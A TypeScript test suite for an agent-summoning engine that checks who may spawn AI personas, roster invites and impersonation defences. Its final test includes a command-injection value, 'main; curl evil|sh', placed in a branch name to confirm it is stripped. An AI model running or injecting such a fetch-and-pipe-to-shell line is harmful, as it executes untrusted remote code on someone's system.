import { describe, it, expect, vi, beforeEach } from "vitest";
import { SummonEngine, type SummonHost, type SummonEvent } from "../../../src/agent/summon.js";

const OWNER = "aa".repeat(32);
const SIBLING = "bb".repeat(32);
const STRANGER = "cc".repeat(32);
const SCOUT_PK = "dd".repeat(32);

function makeHost(over: Partial<SummonHost> = {}) {
  const spawned: { persona: string; channels: string[]; work?: unknown }[] = [];
  const published: { kind: number; tags: string[][]; content: string }[] = [];
  const host: SummonHost = {
    ownerPubkey: OWNER,
    personaExists: (n) => ["scout", "vault"].includes(n),
    personaPubkey: async (n) => (n === "scout" ? SCOUT_PK : undefined),
    agentAlive: () => false,
    registryEntry: () => undefined,
    spawn: async (persona, channels, work) => { spawned.push({ persona, channels, work }); },
    restart: async (persona, channels, work) => { spawned.push({ persona, channels, work }); },
    query: async () => [],
    publish: async (t) => { published.push(t); },
    announceTimeout: () => {},
    ...over,
  };
  return { host, spawned, published };
}

const msg = (pubkey: string, content: string, extra: string[][] = []): SummonEvent => ({
  kind: 47103, pubkey, content, tags: [["h", "chan1"], ...extra],
});

describe("SummonEngine — channel messages", () => {
  beforeEach(() => vi.useRealTimers());

  it("owner mention of an existing persona spawns it into the channel", async () => {
    const { host, spawned } = makeHost();
    const engine = new SummonEngine(host);
    await engine.handleEvent(msg(OWNER, "hey @scout look at this"));
    expect(spawned).toEqual([{ persona: "scout", channels: ["chan1"], work: undefined }]);
  });

  it("stranger mentions never summon; attested siblings do", async () => {
    const { host, spawned } = makeHost();
    const engine = new SummonEngine(host);
    await engine.handleEvent(msg(STRANGER, "@scout go"));
    expect(spawned).toHaveLength(0);
    engine.noteAttestation(SIBLING);
    await engine.handleEvent(msg(SIBLING, "@scout go"));
    expect(spawned).toHaveLength(1);
  });

  it("depth >= 5 never summons", async () => {
    const { host, spawned } = makeHost();
    const engine = new SummonEngine(host);
    await engine.handleEvent(msg(OWNER, "@scout go", [["depth", "5"]]));
    expect(spawned).toHaveLength(0);
  });

  it("unknown personas and code-fenced mentions are ignored", async () => {
    const { host, spawned } = makeHost();
    const engine = new SummonEngine(host);
    await engine.handleEvent(msg(OWNER, "@nobody and `@scout` in backticks"));
    expect(spawned).toHaveLength(0);
  });

  it("an agent's own message never summons it (self-summon guard)", async () => {
    const { host, spawned } = makeHost();
    const engine = new SummonEngine(host);
    await engine.handleEvent(msg(SCOUT_PK, "@scout failed to start"));
    expect(spawned).toHaveLength(0);
  });

  it("cooldown suppresses a re-summon inside the window", async () => {
    vi.useFakeTimers();
    // agentAlive stays false (the first spawn 'died'): only the cooldown
    // stands between the two mentions.
    const { host, spawned } = makeHost();
    const engine = new SummonEngine(host, { cooldownMs: 15_000 });
    await engine.handleEvent(msg(OWNER, "@scout go"));
    await engine.handleEvent(msg(OWNER, "@scout go again"));
    expect(spawned).toHaveLength(1);
    await vi.advanceTimersByTimeAsync(16_000);
    await engine.handleEvent(msg(OWNER, "@scout third time"));
    expect(spawned).toHaveLength(2);
    vi.useRealTimers();
  });

  it("a message with no h tag never summons", async () => {
    const { host, spawned } = makeHost();
    const engine = new SummonEngine(host);
    await engine.handleEvent({ kind: 47103, pubkey: OWNER, content: "@scout", tags: [] });
    expect(spawned).toHaveLength(0);
  });
});

describe("SummonEngine — completion paths", () => {
  it("a matching display name cannot attest an unrelated key or let it summon local agents", async () => {
    const { host, published, spawned } = makeHost({ registryEntry: () => ({ channels: ["chan1"] }) });
    const engine = new SummonEngine(host);
    await engine.handleEvent({ kind: 47000, pubkey: STRANGER, content: JSON.stringify({ name: "scout" }), tags: [] });
    await engine.handleEvent(msg(STRANGER, "@scout run this"));
    expect(published.some((event) => event.kind === 47006 && event.tags.some((tag) => tag[1] === STRANGER))).toBe(false);
    expect(spawned).toHaveLength(0);
  });

  it("a pending summon cannot invite an unrelated key claiming the persona's name", async () => {
    const { host, published } = makeHost({ query: rosterQuery([["p", OWNER, "owner"]]) });
    const engine = new SummonEngine(host);
    await engine.handleEvent(msg(OWNER, "@scout go"));
    published.length = 0;
    await engine.handleEvent({ kind: 47000, pubkey: STRANGER, content: JSON.stringify({ name: "scout" }), tags: [] });
    expect(published.filter((event) => event.kind === 47102).flatMap((event) => event.tags)).not.toContainEqual(["p", STRANGER, "bot"]);
    await engine.handleEvent({ kind: 47000, pubkey: SCOUT_PK, content: JSON.stringify({ name: "scout" }), tags: [] });
    expect(published.filter((event) => event.kind === 47102).flatMap((event) => event.tags)).toContainEqual(["p", SCOUT_PK, "bot"]);
  });

  it("invites only build on the workspace owner's roster", async () => {
    const { host, published } = makeHost({ query: async () => [
      { kind: 47102, pubkey: OWNER, created_at: 100, content: "", tags: [["d", "roster"], ["p", OWNER, "owner"], ["p", SIBLING, "member"]] },
      { kind: 47102, pubkey: STRANGER, created_at: 200, content: "", tags: [["d", "roster"], ["p", STRANGER, "admin"]] },
    ] });
    await new SummonEngine(host).handleEvent(msg(OWNER, "@scout go"));
    const roster = published.find((event) => event.kind === 47102)!;
    expect(roster.tags).toContainEqual(["p", SIBLING, "member"]);
    expect(roster.tags).not.toContainEqual(["p", STRANGER, "admin"]);
  });

  it.each([false, true])("invites preserve the canonical roster on timestamp ties (reversed arrival: %s)", async (reversed) => {
    const rosters: SummonEvent[] = [
      { id: "00".repeat(32), kind: 47102, pubkey: OWNER, created_at: 100, content: "", tags: [["d", "roster"], ["p", OWNER, "owner"], ["p", SIBLING, "member"]] },
      { id: "ff".repeat(32), kind: 47102, pubkey: OWNER, created_at: 100, content: "", tags: [["d", "roster"], ["p", OWNER, "owner"], ["p", STRANGER, "member"]] },
    ];
    const { host, published } = makeHost({ query: async () => reversed ? [...rosters].reverse() : rosters });
    await new SummonEngine(host).handleEvent(msg(OWNER, "@scout go"));
    expect(published.find((event) => event.kind === 47102)?.tags).toEqual([
      ["d", "roster"], ["p", OWNER, "owner"], ["p", SIBLING, "member"], ["p", SCOUT_PK, "bot"],
    ]);
  });

  it("an unrelated roster cannot supply the missing owner's roster", async () => {
    const { host, published } = makeHost({ query: async () => [
      { kind: 47102, pubkey: STRANGER, created_at: 200, content: "", tags: [["d", "roster"], ["p", STRANGER, "admin"]] },
    ] });
    await new SummonEngine(host).handleEvent(msg(OWNER, "@scout go"));
    expect(published.filter((event) => event.kind === 47102)).toHaveLength(0);
  });

  it("a failed attestation grants no summon authority and a legitimate announcement retries it", async () => {
    let fail = true;
    const { host, spawned } = makeHost({
      registryEntry: () => ({ channels: ["chan1"] }),
      publish: async () => { if (fail) throw new Error("offline"); },
    });
    const engine = new SummonEngine(host);
    const announcement = { kind: 47000, pubkey: SCOUT_PK, content: JSON.stringify({ name: "scout" }), tags: [] };
    await engine.handleEvent(announcement);
    await engine.handleEvent(msg(SCOUT_PK, "@vault go"));
    expect(spawned).toHaveLength(0);
    fail = false;
    await engine.handleEvent(announcement);
    await engine.handleEvent(msg(SCOUT_PK, "@vault go"));
    expect(spawned).toEqual([{ persona: "vault", channels: ["chan1"], work: undefined }]);
  });

  it("a valid announcement can retry its pending invite after the roster query recovers", async () => {
    let online = false;
    const { host, published } = makeHost({ query: (filters) => online ? rosterQuery([["p", OWNER, "owner"]])(filters) : Promise.resolve([]) });
    const engine = new SummonEngine(host);
    const announcement = { kind: 47000, pubkey: SCOUT_PK, content: JSON.stringify({ name: "scout" }), tags: [] };
    await engine.handleEvent(msg(OWNER, "@scout go"));
    await engine.handleEvent(announcement);
    expect(published.filter((event) => event.kind === 47102)).toHaveLength(0);
    online = true;
    await engine.handleEvent(announcement);
    expect(published.filter((event) => event.kind === 47102).flatMap((event) => event.tags)).toContainEqual(["p", SCOUT_PK, "bot"]);
  });

  it.each([false, true])("concurrent persona invites preserve members and recover from failed writes (first fails: %s)", async (failFirst) => {
    let roster: SummonEvent = { kind: 47102, pubkey: OWNER, created_at: 100, content: "", tags: [["d", "roster"], ["p", OWNER, "owner"]] };
    let releaseFirst!: () => void;
    const firstWrite = new Promise<void>((resolve) => { releaseFirst = resolve; });
    let publishingFirst!: () => void;
    const started = new Promise<void>((resolve) => { publishingFirst = resolve; });
    let writes = 0;
    const { host } = makeHost({
      personaPubkey: async (name) => name === "scout" ? SCOUT_PK : SIBLING,
      query: async (filters) => (filters[0] as { kinds?: number[] }).kinds?.includes(47102) ? [roster] : [],
      publish: async (template) => {
        if (template.kind !== 47102) return;
        if (writes++ === 0) {
          publishingFirst();
          await firstWrite;
          if (failFirst) throw new Error("first write failed");
        }
        roster = { ...template, pubkey: OWNER };
      },
    });
    const engine = new SummonEngine(host);
    const first = engine.handleEvent(msg(OWNER, "@scout go"));
    await started;
    const second = engine.handleEvent(msg(OWNER, "@vault go"));
    await new Promise<void>((resolve) => setImmediate(resolve));
    releaseFirst();
    await Promise.all([first, second]);
    expect(roster.tags).toContainEqual(["p", OWNER, "owner"]);
    expect(roster.tags).toContainEqual(["p", SIBLING, "bot"]);
    if (!failFirst) expect(roster.tags).toContainEqual(["p", SCOUT_PK, "bot"]);
  });

  it("announcement of a pending persona publishes attestation + roster invite", async () => {
    // The roster query must return a real roster for the invite to build on:
    // an empty result reads as a failed query and publishes nothing (see the
    // roster-safety tests below).
    const { host, published, spawned } = makeHost({ query: rosterQuery([["p", OWNER, "owner"]]) });
    const engine = new SummonEngine(host);
    await engine.handleEvent(msg(OWNER, "@scout go"));
    expect(spawned).toHaveLength(1);
    await engine.handleEvent({ kind: 47000, pubkey: SCOUT_PK, content: JSON.stringify({ name: "scout" }), tags: [] });
    const kinds = published.map((p) => p.kind).sort();
    // pre-invite (at spawn) and the announce path both run; both may publish
    // — the assertion is that attestation and roster invite happened at all.
    expect(kinds).toContain(47006);
    expect(kinds).toContain(47102);
  });

  it("doc-comment mentions summon with the same authority rules", async () => {
    const { host, spawned } = makeHost();
    const engine = new SummonEngine(host);
    await engine.handleEvent({ kind: 40101, pubkey: STRANGER, content: "@scout fix this", tags: [["h", "chan1"]] });
    expect(spawned).toHaveLength(0);
    await engine.handleEvent({ kind: 40101, pubkey: OWNER, content: "@scout fix this", tags: [["h", "chan1"]] });
    expect(spawned).toEqual([{ persona: "scout", channels: ["chan1"], work: undefined }]);
  });

  it("gift wrap for a sleeping announced agent summons it with its registry channels", async () => {
    const { host, spawned } = makeHost({ registryEntry: () => ({ channels: ["chanX"] }) });
    const engine = new SummonEngine(host);
    engine.noteAnnouncement(SCOUT_PK, "scout");
    await engine.handleGiftWrapRecipient(SCOUT_PK);
    expect(spawned).toEqual([{ persona: "scout", channels: ["chanX"], work: undefined }]);
  });

  it("gift wrap for an unannounced pubkey does nothing", async () => {
    const { host, spawned } = makeHost();
    const engine = new SummonEngine(host);
    await engine.handleGiftWrapRecipient(STRANGER);
    expect(spawned).toHaveLength(0);
  });

  it("gift wrap for a key claiming a local persona's name cannot wake that persona", async () => {
    const { host, spawned } = makeHost();
    const engine = new SummonEngine(host);
    engine.noteAnnouncement(STRANGER, "scout");
    await engine.handleGiftWrapRecipient(STRANGER);
    expect(spawned).toHaveLength(0);
  });

  it("running agent mentioned in a NEW channel restarts with the union", async () => {
    const restarts: unknown[] = [];
    const { host, spawned } = makeHost({
      agentAlive: () => true,
      registryEntry: () => ({ channels: ["chanOld"] }),
      restart: async (persona, channels, work) => { restarts.push({ persona, channels, work }); },
    });
    const engine = new SummonEngine(host);
    await engine.handleEvent(msg(OWNER, "@scout come here"));
    expect(spawned).toHaveLength(0);
    expect(restarts).toEqual([{ persona: "scout", channels: ["chanOld", "chan1"], work: undefined }]);
  });

  it("running agent already serving the channel is left alone", async () => {
    const restarts: unknown[] = [];
    const { host, spawned } = makeHost({
      agentAlive: () => true,
      registryEntry: () => ({ channels: ["chan1"] }),
      restart: async (...a) => { restarts.push(a); },
    });
    const engine = new SummonEngine(host);
    await engine.handleEvent(msg(OWNER, "@scout ping"));
    expect(spawned).toHaveLength(0);
    expect(restarts).toHaveLength(0);
  });

  it("an empty roster query publishes no roster at all", async () => {
    // BrowserWire.query resolves [] whenever no socket is OPEN, so an empty
    // result means the QUERY failed, not that the workspace is empty. A 47102
    // minted from that blip would hold only the new agent and, being newer,
    // replace the real roster — the owner-less wipe publishRoster guards.
    const { host, published } = makeHost();
    const engine = new SummonEngine(host);
    await engine.handleEvent(msg(OWNER, "@scout go"));
    await engine.handleEvent({ kind: 47000, pubkey: SCOUT_PK, content: JSON.stringify({ name: "scout" }), tags: [] });
    expect(published.filter((p) => p.kind === 47102)).toHaveLength(0);
    expect(published.map((p) => p.kind)).toContain(47006); // attestation still lands
  });

  const rosterQuery = (ptags: string[][]) => async (filters: object[]) => {
    const f = filters[0] as { kinds?: number[] };
    if (f.kinds?.includes(47102)) {
      return [{ kind: 47102, pubkey: OWNER, created_at: 100, content: "", tags: [["d", "roster"], ...ptags] } as SummonEvent];
    }
    return [];
  };

  it("the roster invite carries every existing member forward", async () => {
    const { host, published } = makeHost({ query: rosterQuery([["p", OWNER, "owner"], ["p", SIBLING, "member"]]) });
    const engine = new SummonEngine(host);
    await engine.handleEvent(msg(OWNER, "@scout go"));
    await engine.handleEvent({ kind: 47000, pubkey: SCOUT_PK, content: JSON.stringify({ name: "scout" }), tags: [] });
    const roster = published.find((p) => p.kind === 47102)!;
    expect(roster.tags.filter((t) => t[0] === "p").map((t) => t[1])).toEqual([OWNER, SIBLING, SCOUT_PK]);
  });

  it("the owner is restored even when the stored roster lost them", async () => {
    const { host, published } = makeHost({ query: rosterQuery([["p", SIBLING, "member"]]) });
    const engine = new SummonEngine(host);
    await engine.handleEvent(msg(OWNER, "@scout go"));
    await engine.handleEvent({ kind: 47000, pubkey: SCOUT_PK, content: JSON.stringify({ name: "scout" }), tags: [] });
    const roster = published.find((p) => p.kind === 47102)!;
    expect(roster.tags.filter((t) => t[0] === "p").map((t) => t[1])).toContain(OWNER);
  });

  it("work context: repo channel + ⑂ thread root resolve to {repo, line}; hostile strings degrade", async () => {
    const channelEvent = {
      kind: 47101, pubkey: OWNER, created_at: 10, tags: [],
      content: JSON.stringify({ source: "fez-git", meta: { repo: "cool-repo" } }),
    };
    const rootEvent = { kind: 47103, pubkey: OWNER, content: "⑂ `agent/fix-thing`", tags: [] };
    const queryImpl = async (filters: object[]) => {
      const f = filters[0] as { kinds?: number[]; ids?: string[] };
      if (f.kinds?.includes(47101)) return [channelEvent as SummonEvent];
      if (f.ids) return [rootEvent as SummonEvent];
      return [];
    };
    const { host, spawned } = makeHost({ query: queryImpl });
    await new SummonEngine(host).handleEvent(msg(OWNER, "@scout do it", [["e", "rootid", "", "root"]]));
    expect(spawned).toEqual([{ persona: "scout", channels: ["chan1"], work: { repo: "cool-repo", line: "fix-thing" } }]);

    // hostile line name degrades to repo-only — nothing of it reaches spawn
    rootEvent.content = "⑂ `main; curl evil|sh`";
    const { host: h2, spawned: s2 } = makeHost({ query: queryImpl });
    await new SummonEngine(h2).handleEvent(msg(OWNER, "@vault do it", [["e", "rootid", "", "root"]]));
    expect(s2[0]).toEqual({ persona: "vault", channels: ["chan1"], work: { repo: "cool-repo" } });
  });
});
